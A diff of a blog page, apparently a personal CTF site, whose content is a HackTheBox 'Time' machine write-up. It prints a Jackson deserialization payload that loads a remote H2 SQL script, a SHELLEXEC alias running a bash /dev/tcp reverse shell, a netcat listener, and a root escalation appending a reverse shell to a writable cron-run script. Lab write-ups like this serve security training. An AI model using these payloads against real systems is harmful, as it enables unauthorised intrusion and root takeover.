@@ -1,6 +1,130 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>HTB Time Writeup · Ikonw</title><meta name="description" content="HTB Time Writeup - Ikonw"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Ikonw"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
-</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://p4.itc.cn/q_70/images03/20230225/87c56a7134574d718cd48f0955a962f4.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><!-- Search Bar--><li style="margin-top: 10px;" class="nav-list-item"><form action="/search" method="GET"><input type="text" name="query" placeholder="Search" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; width: 200px;"><button type="submit" style="padding: 8px 12px; border: none; border-radius: 4px; background-color: #007bff; color: white; cursor: pointer;"> </button></form></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTB Time Writeup</h1><div class="tags"><a href="/tags/hackthebox/" class="tag-title">#hackthebox</a><a href="/tags/medium/" class="tag-title">#medium</a></div><div class="post-info">Nov 7, 2020</div><div class="post-content"><p><img src="/images/HTB-Time/image-20201107200513767.png" alt="image-20201107200513767"></p>
-<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.214</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Online JSON parser</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.06 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  
+  
+  <title>  HTB Time Writeup |   Ikonw </title>
+
+ 
+  
+    <link rel="icon" href="/images/favicon.png">
+  
+
+
+  
+<link rel="stylesheet" href="/nayo.min.css">
+ 
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head>  
+  <body>   
+    
+      <header class="header-wrapper">
+  <nav class="inner">
+    <div class="title">
+      <a href="/">
+        <img class="logo" src="/images/logo.png" />
+      </a>
+    </div>
+
+    <ul class="menu">
+      <li class="item">
+        <a class="link" id="menu-home" href="/"> <!-- Home -->
+          <i class="iconfont icon-home"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
+          <i class="iconfont icon-archives"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
+          <i class="iconfont icon-tags"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-about" href="/about"> <!-- About -->
+          <i class="iconfont icon-about"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-search"> <!-- Search -->
+          <i class="iconfont icon-search"></i>
+        </a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<header class="mobile-header-wrapper">
+  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
+</header>   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          <article class="post slideDownMin">
+  
+	
+<div class="header">
+		<p class="title">	
+			HTB Time Writeup
+		</p>
+		<div class="info">	
+			<time>
+				Nov 07, 2020
+			</time>
+
+			
+			
+				<i class="iconfont icon-words"></i>
+				<span class="words">2423
+				</span>
+			
+		</div>
+</div> 
+	
+
+    <script type="text/x-mathjax-config">
+        var post = document.getElementsByClassName("post")[0];  
+        MathJax.Hub.Config({
+            showProcessingMessages: false,
+            messageStyle: "none",    
+            tex2jax: {
+                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
+                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
+            },
+            "HTML-CSS": {            
+                showMathMenu: false
+            }
+        });
+        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
+    </script>
+    <style>.MathJax{outline:0;}</style>
+
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+
+	  <div class="typo post-content ">
+
+		
+			
+				<div class="banner" 
+				src="/images/HTB-Time/image-20201107200513767.png" 
+				style="background-image:url(/images/HTB-Time/image-20201107200513767.png)"> </div>	
+
+		
+
+			
+					<p><img src="/images/HTB-Time/image-20201107200513767.png" alt="image-20201107200513767"></p>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.214</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Online JSON parser</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.06 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>Start to enumerate at the <em>http</em> port</p>
 <p>Not able to find other directory other than the index page</p>
@@ -8,22 +132,22 @@
 <p>Guess this is the only route to <em>user</em></p>
 <p>Tried different input</p>
 <p><img src="/images/HTB-Time/image-20201107201052773.png" alt="image-20201107201052773"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#x27;test&#x27;: was expecting &#x27;null&#x27;, &#x27;true&#x27;, &#x27;false&#x27; or NaN</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.core</span><span class="selector-class">.JsonParseException</span>: Unrecognized token <span class="string">&#x27;test&#x27;</span>: was expecting <span class="string">&#x27;null&#x27;</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span> or NaN</span><br></pre></td></tr></table></figure>
 
 <p>Found some error message.</p>
 <p>After googling, with the keyword <em>fasterxml and jackson</em></p>
 <p>we found this <a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-12384">CVE</a></p>
 <p>Create a <em>inject.sql</em> with bash reverse shell</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        String[] command <span class="operator">=</span> &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(command).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        String[] command <span class="operator">=</span> &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(command).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>Start a python server</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
 
 <p>Also start a listner</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure>
 
 <p>Finally our payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;</span>,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://x.x.x.x/inject.sql&#x27;&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;</span>,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://x.x.x.x/inject.sql&#x27;&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
 
 <p>​	And we got our reverse shell back</p>
 <p><img src="/images/HTB-Time/image-20201107204418416.png" alt="image-20201107204418416"></p>
@@ -32,14 +156,206 @@
 <p> <strong>&#x2F;usr&#x2F;bin&#x2F;timer_backup.sh</strong> is run by Root</p>
 <p><code>-rwxrw-rw- 1 pericles pericles 88 Nov  7 12:50 /usr/bin/timer_backup.sh</code></p>
 <p>We have write permission.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1&quot;</span> &gt;&gt; /usr/bin/timer_backup.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1&quot;</span> &gt;&gt; /usr/bin/timer_backup.sh</span><br></pre></td></tr></table></figure>
 
 <p>and we get a easy root. But the nc will exit somehow less than 30second, another method is to write your public key and enter in SSH</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (230926): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@time:/<span class="comment"># whoami &amp;&amp; id &amp;&amp; hostname</span></span><br><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span> &amp;&amp; hostname</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">time</span><br><span class="line">root@time:/<span class="comment"># exit</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (230926): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@time:/<span class="comment"># whoami &amp;&amp; id &amp;&amp; hostname</span></span><br><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span> &amp;&amp; hostname</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">time</span><br><span class="line">root@time:/<span class="comment"># exit</span></span><br></pre></td></tr></table></figure>
 
 <br/>
 <br/>
 <br/>
 
 <p><img src="/images/root.gif" alt="root"></p>
-</div></article></div></main><footer><div class="paginator"><a href="/2020/11/13/HTB-Academy/" class="prev">PREV</a><a href="/2020/10/06/HTB-Doctor/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2023 <a href="http://example.com">Ikonw</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p></div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>
+  	
+					
+	  </div>     
+	  
+
+	<div class="bottom">
+  <div class="other">
+    <div class="meta">
+      
+      <i class="iconfont icon-category"></i>
+      <a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+
+      
+
+      
+      <i class="iconfont icon-tag"></i>
+      <a class="tag-none-link" href="/tags/hackthebox/" rel="tag">hackthebox</a> <a class="tag-none-link" href="/tags/medium/" rel="tag">medium</a>
+      
+    </div>
+
+    <div class="operate">
+      
+      <span class="text">Share</span>
+      <ul class="share">
+	   			             
+        <li class="iconfont 
+		icon-share-weixin 
+		-mob-share-weixin 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-twitter 
+		-mob-share-twitter 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-google 
+		-mob-share-google 
+		item"
+		></li>		
+   	   
+</ul>	
+
+<script id="-mob-share" 
+src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+      
+    </div>
+  </div>
+
+
+  
+  <nav class="nav">
+    <div class="link">
+      
+      <a href="/2020/10/06/HTB-Doctor/" class="link-wrap">
+        <strong class="caption">older</strong>
+        
+        <span class="title">
+          HTB Doctor Writeup
+        </span>
+      </a>
+      
+    </div>
+    <div class="link">
+      
+      <a href="/2020/11/13/HTB-Academy/" class="link-wrap">
+        <strong class="caption">newer</strong>
+        
+        <span class="title">
+          HTB Academy Writeup
+        </span>
+      </a>
+      
+    </div>
+  </nav>
+  
+</div> 
+	
+<div class="comment">
+
+    
+
+    <div id="comment">
+    </div>
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+
+    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+
+    <script>
+        new Valine({
+            el: '#comment',
+            notify: false,
+            verify: false,
+            app_id: 'cFM0eCo0CQ9xmBXmHi1eltol-gzGzoHsz',
+            app_key: 'oh9tizsnvV2vNvWgqEvoNtQO',
+            path: window.location.pathname,
+            avatar: 'mm',
+            guest_info: ['nick', 'mail']
+        });
+    </script>
+    
+</div>	
+</article>
+
+          </div> 
+      </div>            
+    
+        <i id="toTop" class="iconfont icon-backtotop"></i>
+
+  
+    <div class="none" id="search">
+    <div class="header">
+        <input type="text" 
+        placeholder="Typing Something here." 
+        id="search-input" 
+        class="input" />
+        
+        <i id="search-cancel" class="iconfont icon-cancel"></i>
+    </div>
+
+    <div id="search-result" class="result"></div>
+</div>
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">Home
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">Archives
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">Tags
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">About
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+<footer class="footer">
+	<div class="inner">
+		<div class="copyright">
+			&copy;
+			
+			2019 -
+			
+			2023
+			Ikonw
+
+			<br/>
+			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>
+	</div>
+</footer>   
+
+    
+<script src="/nayo.bundle.js"></script>
+           
+  </body>        
+</html>
